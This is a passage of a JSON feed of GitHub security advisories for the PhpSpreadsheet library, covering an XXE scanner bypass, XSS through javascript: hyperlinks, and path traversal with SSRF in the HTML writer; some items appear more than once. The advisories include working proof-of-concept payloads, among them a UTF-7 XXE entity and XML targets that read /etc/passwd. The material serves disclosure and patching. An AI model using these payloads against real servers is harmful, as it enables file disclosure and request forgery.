            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>The security scanner responsible for preventing XXE attacks in the XLSX reader can be bypassed by slightly modifying the XML structure, utilizing white-spaces. On servers that allow users to upload their own Excel (XLSX) sheets, Server files and sensitive information can be disclosed by providing a crafted sheet. </p>\n<h3 id=\"details\">Details</h3>\n<p>The security scan function in <code>src/PhpSpreadsheet/Reader/Security/XmlScanner.php</code> contains a flawed XML encoding check to retrieve the input file's XML encoding in the <code>toUtf8</code> function. </p>\n<p>The function searches for the XML encoding through a defined regex which looks for <code>encoding=\"*\"</code> and/or <code>encoding='*'</code>, if not found, it defaults to the UTF-8 encoding which bypasses the conversion logic. </p>\n<pre><code>$patterns = [\n           '/encoding=\"([^\"]*]?)\"/',\n           \"/encoding='([^']*?)'/\",\n];\n</code></pre>\n<p>This logic can be used to pass a UTF-7 encoded XXE payload, by utilizing a whitespace before or after the <code>=</code> in the attribute definition. </p>\n<h3 id=\"poc\">PoC</h3>\n<p>Needed:</p>\n<ul>\n<li>An Excel sheet (XLSX) with at least one cell containing a value.</li>\n</ul>\n<p>Unzip the excel sheet, and modify the <code>xl/SharedStrings.xml</code> file with the following value (note the space after <code>encoding=</code>):</p>\n<pre><code>&lt;?xml version=\"1.0\" encoding= 'UTF-7' standalone=\"yes\"?&gt;\n+ADw-!DOCTYPE abc [ ... ]&gt;\n</code></pre>\n<h4 id=\"step-by-step\">Step-by-step</h4>\n<ol>\n<li>First off, the following string is encoded in base64:</li>\n</ol>\n<pre><code>&lt;!ENTITY internal 'abc'  &gt;\" \n</code></pre>\n<p>Resulting in:</p>\n<pre><code>PCFFTlRJVFkgaW50ZXJuYWwgJ2FiYycgID4K\n</code></pre>\n<ol start=\"2\">\n<li>The string is used with a parameter entity and the PHP filter wrapper to ultimately define custom entities and call them within the XML.</li>\n</ol>\n<pre><code>&lt;?xml version=\"1.0\" encoding= 'UTF-7' standalone=\"yes\"?&gt;\n+ADw-!DOCTYPE foo [ &lt;!ENTITY % xxe SYSTEM \"php://filter//resource=data://text/plain;base64,PCFFTlRJVFkgaW50ZXJuYWwgJ2FiYycgID4K\" &gt; %xxe;]&gt;\n&lt;sst xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/2006/main\" count=\"1\" uniqueCount=\"1\"&gt;&lt;si&gt;&lt;t&gt;&amp;internal;&lt;/t&gt;&lt;/si&gt;&lt;/sst&gt;\n</code></pre>\n<p>When this file is parsed by the library, the value <code>abc</code> should be in the original filled cell.</p>\n<p>With the help of the PHP filter wrapper, this can be escalated to information disclosure/file read. </p>\n<h3 id=\"impact\">Impact</h3>\n<p>Sensitive information disclosure through the XXE on sites that allow users to upload their own excel spreadsheets, and parse them using PHPSpreadsheet's Excel parser.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-6hwr-6v2f-3m88\">https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-6hwr-6v2f-3m88</a></li>\n<li><a href=\"https://github.com/PHPOffice/PhpSpreadsheet/commit/3bcd51826b7f089d1641e756c83030c30c3bdb0c\">https://github.com/PHPOffice/PhpSpreadsheet/commit/3bcd51826b7f089d1641e756c83030c30c3bdb0c</a></li>\n<li><a href=\"https://github.com/PHPOffice/PhpSpreadsheet/commit/7d6cb09f6e8204f65e6dd5a0490f7f45f44bb331\">https://github.com/PHPOffice/PhpSpreadsheet/commit/7d6cb09f6e8204f65e6dd5a0490f7f45f44bb331</a></li>\n<li><a href=\"https://github.com/PHPOffice/PhpSpreadsheet/commit/949ff63e1f6413e6485f73af012d506aa81384bf\">https://github.com/PHPOffice/PhpSpreadsheet/commit/949ff63e1f6413e6485f73af012d506aa81384bf</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-45293\">https://nvd.nist.gov/vuln/detail/CVE-2024-45293</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-6hwr-6v2f-3m88\">https://github.com/advisories/GHSA-6hwr-6v2f-3m88</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-6hwr-6v2f-3m88",
            "title": "[phpoffice/phpspreadsheet] XXE in PHPSpreadsheet's XLSX reader",
            "date_modified": "2024-10-07T22:30:08.000Z",
            "date_published": "2024-10-07T15:58:52.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-6hwr-6v2f-3m88"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p><code>\\PhpOffice\\PhpSpreadsheet\\Writer\\Html</code> does not sanitize \"javascript:\" URLs from hyperlink <code>href</code> attributes, resulting in a Cross-Site Scripting vulnerability.</p>\n<h3 id=\"poc\">PoC</h3>\n<p>Example target script:</p>\n<pre><code>&lt;?php\n\nrequire 'vendor/autoload.php';\n\n$reader = \\PhpOffice\\PhpSpreadsheet\\IOFactory::createReader(\"Xlsx\");\n$spreadsheet = $reader-&gt;load(__DIR__ . '/book.xlsx');\n\n$writer = new \\PhpOffice\\PhpSpreadsheet\\Writer\\Html($spreadsheet);\nprint($writer-&gt;generateHTMLAll());\n</code></pre>\n<p>Save this file in the same directory:\n<a href=\"https://github.com/PHPOffice/PhpSpreadsheet/files/15099763/book.xlsx\">book.xlsx</a></p>\n<p>Open index.php in a web browser and click on both links. The first demonstrates the vulnerability in a regular hyperlink and the second in a HYPERLINK() formula.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-r8w8-74ww-j4wh\">https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-r8w8-74ww-j4wh</a></li>\n<li><a href=\"https://github.com/PHPOffice/PhpSpreadsheet/commit/392dd08c5569b623060784e1333454d64df1f03d\">https://github.com/PHPOffice/PhpSpreadsheet/commit/392dd08c5569b623060784e1333454d64df1f03d</a></li>\n<li><a href=\"https://github.com/PHPOffice/PhpSpreadsheet/commit/8b9b378ecdc603234a34aab3b293d2cdc8e9210e\">https://github.com/PHPOffice/PhpSpreadsheet/commit/8b9b378ecdc603234a34aab3b293d2cdc8e9210e</a></li>\n<li><a href=\"https://github.com/PHPOffice/PhpSpreadsheet/commit/f0b70ed1086348904b27772b264e1605ba6c1d6d\">https://github.com/PHPOffice/PhpSpreadsheet/commit/f0b70ed1086348904b27772b264e1605ba6c1d6d</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-45292\">https://nvd.nist.gov/vuln/detail/CVE-2024-45292</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-r8w8-74ww-j4wh\">https://github.com/advisories/GHSA-r8w8-74ww-j4wh</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-r8w8-74ww-j4wh",
            "title": "[phpoffice/phpspreadsheet] PhpSpreadsheet HTML writer is vulnerable to Cross-Site Scripting via JavaScript hyperlinks",
            "date_modified": "2024-10-07T22:29:54.000Z",
            "date_published": "2024-10-07T15:58:25.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-r8w8-74ww-j4wh"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p><code>\\PhpOffice\\PhpSpreadsheet\\Writer\\Html</code> does not sanitize \"javascript:\" URLs from hyperlink <code>href</code> attributes, resulting in a Cross-Site Scripting vulnerability.</p>\n<h3 id=\"poc\">PoC</h3>\n<p>Example target script:</p>\n<pre><code>&lt;?php\n\nrequire 'vendor/autoload.php';\n\n$reader = \\PhpOffice\\PhpSpreadsheet\\IOFactory::createReader(\"Xlsx\");\n$spreadsheet = $reader-&gt;load(__DIR__ . '/book.xlsx');\n\n$writer = new \\PhpOffice\\PhpSpreadsheet\\Writer\\Html($spreadsheet);\nprint($writer-&gt;generateHTMLAll());\n</code></pre>\n<p>Save this file in the same directory:\n<a href=\"https://github.com/PHPOffice/PhpSpreadsheet/files/15099763/book.xlsx\">book.xlsx</a></p>\n<p>Open index.php in a web browser and click on both links. The first demonstrates the vulnerability in a regular hyperlink and the second in a HYPERLINK() formula.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-r8w8-74ww-j4wh\">https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-r8w8-74ww-j4wh</a></li>\n<li><a href=\"https://github.com/PHPOffice/PhpSpreadsheet/commit/392dd08c5569b623060784e1333454d64df1f03d\">https://github.com/PHPOffice/PhpSpreadsheet/commit/392dd08c5569b623060784e1333454d64df1f03d</a></li>\n<li><a href=\"https://github.com/PHPOffice/PhpSpreadsheet/commit/8b9b378ecdc603234a34aab3b293d2cdc8e9210e\">https://github.com/PHPOffice/PhpSpreadsheet/commit/8b9b378ecdc603234a34aab3b293d2cdc8e9210e</a></li>\n<li><a href=\"https://github.com/PHPOffice/PhpSpreadsheet/commit/f0b70ed1086348904b27772b264e1605ba6c1d6d\">https://github.com/PHPOffice/PhpSpreadsheet/commit/f0b70ed1086348904b27772b264e1605ba6c1d6d</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-45292\">https://nvd.nist.gov/vuln/detail/CVE-2024-45292</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-r8w8-74ww-j4wh\">https://github.com/advisories/GHSA-r8w8-74ww-j4wh</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-r8w8-74ww-j4wh",
            "title": "[phpoffice/phpspreadsheet] PhpSpreadsheet HTML writer is vulnerable to Cross-Site Scripting via JavaScript hyperlinks",
            "date_modified": "2024-10-07T22:29:54.000Z",
            "date_published": "2024-10-07T15:58:25.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-r8w8-74ww-j4wh"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p><code>\\PhpOffice\\PhpSpreadsheet\\Writer\\Html</code> does not sanitize \"javascript:\" URLs from hyperlink <code>href</code> attributes, resulting in a Cross-Site Scripting vulnerability.</p>\n<h3 id=\"poc\">PoC</h3>\n<p>Example target script:</p>\n<pre><code>&lt;?php\n\nrequire 'vendor/autoload.php';\n\n$reader = \\PhpOffice\\PhpSpreadsheet\\IOFactory::createReader(\"Xlsx\");\n$spreadsheet = $reader-&gt;load(__DIR__ . '/book.xlsx');\n\n$writer = new \\PhpOffice\\PhpSpreadsheet\\Writer\\Html($spreadsheet);\nprint($writer-&gt;generateHTMLAll());\n</code></pre>\n<p>Save this file in the same directory:\n<a href=\"https://github.com/PHPOffice/PhpSpreadsheet/files/15099763/book.xlsx\">book.xlsx</a></p>\n<p>Open index.php in a web browser and click on both links. The first demonstrates the vulnerability in a regular hyperlink and the second in a HYPERLINK() formula.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-r8w8-74ww-j4wh\">https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-r8w8-74ww-j4wh</a></li>\n<li><a href=\"https://github.com/PHPOffice/PhpSpreadsheet/commit/392dd08c5569b623060784e1333454d64df1f03d\">https://github.com/PHPOffice/PhpSpreadsheet/commit/392dd08c5569b623060784e1333454d64df1f03d</a></li>\n<li><a href=\"https://github.com/PHPOffice/PhpSpreadsheet/commit/8b9b378ecdc603234a34aab3b293d2cdc8e9210e\">https://github.com/PHPOffice/PhpSpreadsheet/commit/8b9b378ecdc603234a34aab3b293d2cdc8e9210e</a></li>\n<li><a href=\"https://github.com/PHPOffice/PhpSpreadsheet/commit/f0b70ed1086348904b27772b264e1605ba6c1d6d\">https://github.com/PHPOffice/PhpSpreadsheet/commit/f0b70ed1086348904b27772b264e1605ba6c1d6d</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-45292\">https://nvd.nist.gov/vuln/detail/CVE-2024-45292</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-r8w8-74ww-j4wh\">https://github.com/advisories/GHSA-r8w8-74ww-j4wh</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-r8w8-74ww-j4wh",
            "title": "[phpoffice/phpspreadsheet] PhpSpreadsheet HTML writer is vulnerable to Cross-Site Scripting via JavaScript hyperlinks",
            "date_modified": "2024-10-07T22:29:54.000Z",
            "date_published": "2024-10-07T15:58:25.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-r8w8-74ww-j4wh"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>It's possible for an attacker to construct an XLSX file that links images from arbitrary paths. When embedding images has been enabled in HTML writer with <code>$writer-&gt;setEmbedImages(true);</code> those files will be included in the output as <code>data:</code> URLs, regardless of the file's type. Also URLs can be used for embedding, resulting in a Server-Side Request Forgery vulnerability.</p>\n<h3 id=\"details\">Details</h3>\n<p>XLSX files allow embedding or linking media. When </p>\n<p>In <code>xl/drawings/drawing1.xml</code> an attacker can do e.g.:</p>\n<pre><code class=\"language-xml\">&lt;a:blip cstate=\"print\" r:link=\"rId1\" /&gt;\n</code></pre>\n<p>And then, in <code>xl/drawings/_rels/drawing1.xml.rels</code> they can set the path to anything, such as:</p>\n<pre><code class=\"language-xml\">&lt;Relationship Id=\"rId1\"\n    Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/image\"\n    Target=\"/etc/passwd\" /&gt;\n</code></pre>\n<p>or</p>\n<pre><code class=\"language-xml\">&lt;Relationship Id=\"rId1\"\n    Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/image\"\n    Target=\"http://example.org\" /&gt;\n</code></pre>\n<p>When the HTML writer is outputting the image, it does not check the path in any way. Also the <code>getimagesize()</code> call does not mitigate this, because when <code>getimagesize()</code> returns false, an empty mime type is used.</p>\n<pre><code class=\"language-php\">if ($this-&gt;embedImages || str_starts_with($imageData, 'zip://')) {\n    $picture = @file_get_contents($filename);\n    if ($picture !== false) {\n        $imageDetails = getimagesize($filename) ?: ['mime' =&gt; ''];\n        // base64 encode the binary data\n        $base64 = base64_encode($picture);\n        $imageData = 'data:' . $imageDetails['mime'] . ';base64,' . $base64;\n    }\n}\n\n$html .= '&lt;img style=\"position: absolute; z-index: 1; left: '\n    . $drawing-&gt;getOffsetX() . 'px; top: ' . $drawing-&gt;getOffsetY() . 'px; width: '\n    . $drawing-&gt;getWidth() . 'px; height: ' . $drawing-&gt;getHeight() . 'px;\" src=\"'\n    . $imageData . '\" alt=\"' . $filedesc . '\" /&gt;';\n</code></pre>\n<h3 id=\"poc\">PoC</h3>\n<pre><code class=\"language-php\">&lt;?php\n\nrequire 'vendor/autoload.php';\n\n$reader = \\PhpOffice\\PhpSpreadsheet\\IOFactory::createReader(\"Xlsx\");\n$spreadsheet = $reader-&gt;load(__DIR__ . '/book.xlsx');\n\n$writer = new \\PhpOffice\\PhpSpreadsheet\\Writer\\Html($spreadsheet);\n$writer-&gt;setEmbedImages(true);\n$output = $writer-&gt;generateHTMLAll();\n\n// The below is just for demo purposes\n\n$pattern = '/data:;base64,(?&lt;data&gt;[^\"]+)/i';\n\npreg_match_all($pattern, $output, $matches);\n\nprint(\"*** /etc/passwd content: ***\\n\");\nprint(base64_decode($matches['data'][0]));\n\nprint(\"*** HTTP response content: ***\\n\");\nprint(base64_decode($matches['data'][1]));\n</code></pre>\n<p>Add this file in the same directory:\n<a href=\"https://github.com/PHPOffice/PhpSpreadsheet/files/15213066/book.xlsx\">book.xlsx</a></p>\n<p>Run with:\n<code>php index.php</code></p>\n<h3 id=\"impact\">Impact</h3>\n<p>When embedding images has been enabled, an attacker can read arbitrary files on the server and perform arbitrary HTTP GET requests, potentially e.g. <a href=\"https://hackingthe.cloud/aws/exploitation/ec2-metadata-ssrf/\">revealing secrets</a>. Note that any PHP protocol wrappers can be used, meaning that if for example the <code>expect://</code> wrapper is enabled, also remote code execution is possible.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-w9xv-qf98-ccq4\">https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-w9xv-qf98-ccq4</a></li>\n<li><a href=\"https://github.com/PHPOffice/PhpSpreadsheet/commit/a9693d1182df6695c14bc5d74315ac71a3398e5a\">https://github.com/PHPOffice/PhpSpreadsheet/commit/a9693d1182df6695c14bc5d74315ac71a3398e5a</a></li>\n<li><a href=\"https://github.com/PHPOffice/PhpSpreadsheet/commit/d95bc290beb137d4118095b96f62ec47e0205cec\">https://github.com/PHPOffice/PhpSpreadsheet/commit/d95bc290beb137d4118095b96f62ec47e0205cec</a></li>\n<li><a href=\"https://github.com/PHPOffice/PhpSpreadsheet/commit/e04ed222b36fd5fd6fed0c10c765c2b68effb465\">https://github.com/PHPOffice/PhpSpreadsheet/commit/e04ed222b36fd5fd6fed0c10c765c2b68effb465</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-45291\">https://nvd.nist.gov/vuln/detail/CVE-2024-45291</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-w9xv-qf98-ccq4\">https://github.com/advisories/GHSA-w9xv-qf98-ccq4</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-w9xv-qf98-ccq4",
            "title": "[phpoffice/phpspreadsheet] PhpSpreadsheet allows absolute path traversal and Server-Side Request Forgery in HTML writer when embedding images is enabled",
            "date_modified": "2024-10-07T22:29:45.000Z",
            "date_published": "2024-10-07T15:58:06.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-w9xv-qf98-ccq4"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>It's possible for an attacker to construct an XLSX file that links images from arbitrary paths. When embedding images has been enabled in HTML writer with <code>$writer-&gt;setEmbedImages(true);</code> those files will be included in the output as <code>data:</code> URLs, regardless of the file's type. Also URLs can be used for embedding, resulting in a Server-Side Request Forgery vulnerability.</p>\n<h3 id=\"details\">Details</h3>\n<p>XLSX files allow embedding or linking media. When </p>\n<p>In <code>xl/drawings/drawing1.xml</code> an attacker can do e.g.:</p>\n<pre><code class=\"language-xml\">&lt;a:blip cstate=\"print\" r:link=\"rId1\" /&gt;\n</code></pre>\n<p>And then, in <code>xl/drawings/_rels/drawing1.xml.rels</code> they can set the path to anything, such as:</p>\n<pre><code class=\"language-xml\">&lt;Relationship Id=\"rId1\"\n    Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/image\"\n    Target=\"/etc/passwd\" /&gt;\n</code></pre>\n<p>or</p>\n<pre><code class=\"language-xml\">&lt;Relationship Id=\"rId1\"\n    Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/image\"\n    Target=\"http://example.org\" /&gt;\n</code></pre>\n<p>When the HTML writer is outputting the image, it does not check the path in any way. Also the <code>getimagesize()</code> call does not mitigate this, because when <code>getimagesize()</code> returns false, an empty mime type is used.</p>\n<pre><code class=\"language-php\">if ($this-&gt;embedImages || str_starts_with($imageData, 'zip://')) {\n    $picture = @file_get_contents($filename);\n    if ($picture !== false) {\n        $imageDetails = getimagesize($filename) ?: ['mime' =&gt; ''];\n        // base64 encode the binary data\n        $base64 = base64_encode($picture);\n        $imageData = 'data:' . $imageDetails['mime'] . ';base64,' . $base64;\n    }\n}\n\n$html .= '&lt;img style=\"position: absolute; z-index: 1; left: '\n    . $drawing-&gt;getOffsetX() . 'px; top: ' . $drawing-&gt;getOffsetY() . 'px; width: '\n    . $drawing-&gt;getWidth() . 'px; height: ' . $drawing-&gt;getHeight() . 'px;\" src=\"'\n    . $imageData . '\" alt=\"' . $filedesc . '\" /&gt;';\n</code></pre>\n<h3 id=\"poc\">PoC</h3>\n<pre><code class=\"language-php\">&lt;?php\n\nrequire 'vendor/autoload.php';\n\n$reader = \\PhpOffice\\PhpSpreadsheet\\IOFactory::createReader(\"Xlsx\");\n$spreadsheet = $reader-&gt;load(__DIR__ . '/book.xlsx');\n\n$writer = new \\PhpOffice\\PhpSpreadsheet\\Writer\\Html($spreadsheet);\n$writer-&gt;setEmbedImages(true);\n$output = $writer-&gt;generateHTMLAll();\n\n// The below is just for demo purposes\n\n$pattern = '/data:;base64,(?&lt;data&gt;[^\"]+)/i';\n\npreg_match_all($pattern, $output, $matches);\n\nprint(\"*** /etc/passwd content: ***\\n\");\nprint(base64_decode($matches['data'][0]));\n\nprint(\"*** HTTP response content: ***\\n\");\nprint(base64_decode($matches['data'][1]));\n</code></pre>\n<p>Add this file in the same directory:\n<a href=\"https://github.com/PHPOffice/PhpSpreadsheet/files/15213066/book.xlsx\">book.xlsx</a></p>\n<p>Run with:\n<code>php index.php</code></p>\n<h3 id=\"impact\">Impact</h3>\n<p>When embedding images has been enabled, an attacker can read arbitrary files on the server and perform arbitrary HTTP GET requests, potentially e.g. <a href=\"https://hackingthe.cloud/aws/exploitation/ec2-metadata-ssrf/\">revealing secrets</a>. Note that any PHP protocol wrappers can be used, meaning that if for example the <code>expect://</code> wrapper is enabled, also remote code execution is possible.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-w9xv-qf98-ccq4\">https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-w9xv-qf98-ccq4</a></li>\n<li><a href=\"https://github.com/PHPOffice/PhpSpreadsheet/commit/a9693d1182df6695c14bc5d74315ac71a3398e5a\">https://github.com/PHPOffice/PhpSpreadsheet/commit/a9693d1182df6695c14bc5d74315ac71a3398e5a</a></li>\n<li><a href=\"https://github.com/PHPOffice/PhpSpreadsheet/commit/d95bc290beb137d4118095b96f62ec47e0205cec\">https://github.com/PHPOffice/PhpSpreadsheet/commit/d95bc290beb137d4118095b96f62ec47e0205cec</a></li>\n<li><a href=\"https://github.com/PHPOffice/PhpSpreadsheet/commit/e04ed222b36fd5fd6fed0c10c765c2b68effb465\">https://github.com/PHPOffice/PhpSpreadsheet/commit/e04ed222b36fd5fd6fed0c10c765c2b68effb465</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-45291\">https://nvd.nist.gov/vuln/detail/CVE-2024-45291</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-w9xv-qf98-ccq4\">https://github.com/advisories/GHSA-w9xv-qf98-ccq4</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-w9xv-qf98-ccq4",
            "title": "[phpoffice/phpspreadsheet] PhpSpreadsheet allows absolute path traversal and Server-Side Request Forgery in HTML writer when embedding images is enabled",
            "date_modified": "2024-10-07T22:29:45.000Z",
            "date_published": "2024-10-07T15:58:06.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-w9xv-qf98-ccq4"
            },
            "tags": [
                "severity"
            ]
        }
    ]
}